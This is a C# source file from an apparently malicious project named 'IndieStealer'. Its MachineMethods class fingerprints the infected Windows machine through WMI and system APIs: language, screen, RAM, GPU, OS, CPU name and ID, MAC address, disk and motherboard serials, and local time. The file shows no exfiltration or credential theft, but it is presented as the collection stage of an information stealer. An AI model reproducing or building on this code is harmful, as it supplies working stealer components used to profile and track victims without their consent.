using System;
using System.Globalization;
using System.Management;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;

namespace IndieStealer.Collect.System
{
    public class MachineMethods
    {
        public static string GetSystemLang()
        {
            try
            {
                CultureInfo ci = CultureInfo.CurrentUICulture;
                return ci.Name;
            }
            catch (Exception ex)
            {}

            return Info.Error;
        }
        public static string GetScreenRes()
        {
            return Screen.PrimaryScreen.Bounds.Width + " x " + Screen.PrimaryScreen.Bounds.Height;
        }

        public static string GetRAM()
        {
            ComputerInfo info = new ComputerInfo();
            string ram = Info.Error;
            try
            {
                ram = info.TotalPhysicalMemory / (1024*1024) + " MB";
            } 
            catch 
            { }
            return ram;
        }
        public static string GetGpu()
        {
            string gpuName = "";
            try
            {
                ManagementObjectCollection moC = new ManagementObjectSearcher("select * from win32_videocontroller").Get();
                int index = 0;
                foreach (var mo in moC) 
                { 
                    gpuName += index > 0 ? ", " + mo["name"].ToString() : mo["name"].ToString();
                    index++;
                }
                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : Info.Error;
            }
            catch {  }
            return Info.Error;
        }
        public static string GetOSInformation()
        {
            try
            {
                foreach (var managementBaseObject in new ManagementObjectSearcher("select * from win32_operatingsystem").Get())
                {
                    
                    string osInfo = string.Concat(new string[] { ((string)managementBaseObject["Caption"]).Trim(), ", ", (string)managementBaseObject["Version"], ", " });
                    return osInfo.Substring(osInfo.IndexOf("Windows", StringComparison.Ordinal)) + " " +
                           (Environment.Is64BitOperatingSystem ? "x64" : "x32");
                }
            }
            catch (Exception)
            {}
            
            return Info.Error;
        }
        public static string GetProcessor()
        {
            string result = Info.Error;
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch (Exception)
            { }
            return result;
        }
        public static string GetMacAddress()
        {          
            try
            {
                ManagementScope theScope = new ManagementScope("\\\\" + Environment.MachineName + "\\root\\cimv2");
                ObjectQuery theQuery = new ObjectQuery("SELECT * FROM Win32_NetworkAdapter");

                foreach (ManagementObject theCurrentObject in new ManagementObjectSearcher(theScope, theQuery).Get())
                {
                    if (theCurrentObject["MACAddress"] != null)
                    {
                        string macAdd = theCurrentObject["MACAddress"].ToString();
                        return macAdd.Replace(':', '-');
                    }
                }
            }
            catch (Exception)
            { }
            return string.Empty;
            
        }
        public static string GetHDDSerialNo()
        {
            string text = "";
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    text += Convert.ToString(managementObject["VolumeSerialNumber"]);
                }
            }
            catch (Exception)
            {}         
            return text;
        }

        public static string GetProcessorId()
        {
            string result = string.Empty;
            try
            {
                ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
                using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
                {
                    if (enumerator.MoveNext())
                    {
                        result = ((ManagementObject)enumerator.Current).Properties["processorID"].Value.ToString();
                    }
                }
            }
            catch
            {}
            return result;
        }

        public static string GetMBoardSerialNum()
        {
            string text = string.Empty;
            try
            {
                ManagementObjectCollection moC = new ManagementObjectSearcher("select * from win32_baseboard").Get();
                foreach (var mo in moC)
                {
                    text = mo["SerialNumber"].ToString();
                }
            }
            catch
            {}         
            return text;
        }

        public static string GetDate()
        {
            try
            {
                int hours = TimeZoneInfo.Local.GetUtcOffset(DateTime.Now).Hours;
                return DateTime.Now + " (UTC " + (hours >= 0 ? "+" : "-") + hours + ")";
            }
            catch (Exception ex)
            { }
            return Info.Error;
        }
    }
}